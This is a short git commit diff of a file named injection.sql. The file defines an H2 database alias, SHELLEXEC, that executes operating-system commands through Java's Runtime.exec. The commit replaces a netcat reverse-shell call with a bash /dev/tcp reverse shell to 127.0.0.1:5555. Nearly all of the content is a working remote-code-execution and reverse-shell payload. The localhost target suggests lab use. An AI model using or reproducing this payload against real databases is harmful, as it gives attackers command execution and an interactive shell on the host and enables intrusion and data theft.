88bca683700a57f317e052e3fd84a3cb8bef33b7
linderoth6 <linderoth6@users.noreply.github.com>
2021-07-05 19:05:32 +0200

    Update injection.sql

--- injection.sql
+++ injection.sql
@@ -3,4 +3,4 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
 	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
 	return s.hasNext() ? s.next() : "";  }
 $$;
-CALL SHELLEXEC('/bin/sh | nc 127.0.0.1 5555')
+CALL SHELLEXEC('sh -i >& /dev/tcp/127.0.0.1/5555 0>&1')
